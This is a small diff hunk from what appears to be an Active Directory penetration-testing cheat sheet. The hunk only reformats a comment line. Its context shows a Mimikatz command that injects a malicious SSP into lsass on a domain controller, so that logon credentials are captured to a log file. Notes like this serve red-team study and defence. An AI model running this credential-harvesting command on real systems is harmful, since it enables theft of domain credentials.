@@ -144,7 +144,7 @@ In case lsass is running as a protected process, we can still use Skeleton Key b
 - Using mimikatz, inject into lsass (Not stable with server 2016)
 	Invoke-Mimikatz -Command '"misc::memssp"'
 
-	# All local logons on the DC are logged to C:\Windows\system32\kiwissp.log
+All local logons on the DC are logged to C:\Windows\system32\kiwissp.log
 
 # 5 Privilege Escalation
 
